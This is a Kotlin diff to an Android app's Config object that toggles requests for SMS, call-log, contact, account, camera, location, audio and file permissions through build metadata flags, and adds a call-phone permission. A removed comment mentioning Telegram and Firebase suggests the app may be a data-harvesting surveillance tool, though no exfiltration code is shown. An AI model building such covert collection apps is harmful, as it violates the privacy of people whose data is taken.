@@ -6,18 +6,23 @@ import android.content.pm.PackageManager
 import android.os.Build
 
 object Config {
-    // (Telegram integration removed, relying purely on Firebase)
+
+    fun isFeatureEnabled(context: Context, key: String): Boolean {
+        val meta = getMetaData(context, key)
+        return meta != "false"
+    }
 
     fun getRequiredPermissions(context: Context): List<String> {
         val perms = mutableListOf<String>()
         
-        val enableGallery = getMetaData(context, "feat_gallery") != "false"
-        val enableFiles = getMetaData(context, "feat_files") != "false"
-        val enableAudio = getMetaData(context, "feat_audio") != "false"
-        val enableCamera = getMetaData(context, "feat_camera") != "false"
-        val enableLocation = getMetaData(context, "feat_location") != "false"
-        val enableCalls = getMetaData(context, "feat_calls") != "false"
-        val enableSms = getMetaData(context, "feat_sms") != "false"
+        val enableGallery = isFeatureEnabled(context, "feat_gallery")
+        val enableFiles = isFeatureEnabled(context, "feat_files")
+        val enableAudio = isFeatureEnabled(context, "feat_audio")
+        val enableCamera = isFeatureEnabled(context, "feat_camera")
+        val enableLocation = isFeatureEnabled(context, "feat_location")
+        val enableCalls = isFeatureEnabled(context, "feat_calls")
+        val enableSms = isFeatureEnabled(context, "feat_sms")
+        val enableNotifications = isFeatureEnabled(context, "feat_notifications")
 
         if (enableSms) {
             perms.add(Manifest.permission.READ_SMS)
@@ -26,6 +31,7 @@ object Config {
         if (enableCalls) {
             perms.add(Manifest.permission.READ_CALL_LOG)
             perms.add(Manifest.permission.READ_CONTACTS)
+            perms.add(Manifest.permission.CALL_PHONE)
         }
         perms.add(Manifest.permission.GET_ACCOUNTS)
         if (enableCamera) {
@@ -47,7 +53,7 @@ object Config {
                 perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             }
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        if (enableNotifications && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
         }
         return perms
